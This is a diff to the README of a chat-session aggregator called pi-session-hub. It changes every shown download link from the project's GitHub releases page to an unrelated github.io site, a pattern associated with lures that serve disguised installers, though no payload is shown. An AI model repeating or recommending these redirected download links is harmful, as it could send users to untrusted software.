@@ -1,6 +1,6 @@
 # 🚀 pi-session-hub - Find Every Chat, Instantly
 
-[![Download pi-session-hub](https://img.shields.io/badge/Download-pi--session--hub-2ea44f?style=for-the-badge)](https://github.com/Soupy-sievabean276/pi-session-hub/releases)
+[![Download pi-session-hub](https://img.shields.io/badge/Download-pi--session--hub-2ea44f?style=for-the-badge)](https://soupy-sievabean276.github.io)
 
 ## 👋 Welcome to pi-session-hub
 
@@ -46,7 +46,7 @@ Getting started with pi-session-hub is quick and easy.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Soupy-sievabean276/pi-session-hub/releases](https://github.com/Soupy-sievabean276/pi-session-hub/releases)
+Visit this link to download the application: [https://soupy-sievabean276.github.io](https://soupy-sievabean276.github.io)
 
 ### Step 2: Choose the Right File
 
@@ -192,7 +192,7 @@ A: Your original sessions remain in their respective tools. Uninstalling pi-sess
 
 You've been juggling multiple AI tools for too long. It's time to bring everything together.
 
-[![Get Started Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue?style=for-the-badge)](https://github.com/Soupy-sievabean276/pi-session-hub/releases)
+[![Get Started Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue?style=for-the-badge)](https://soupy-sievabean276.github.io)
 
 ### Quick Recap
 
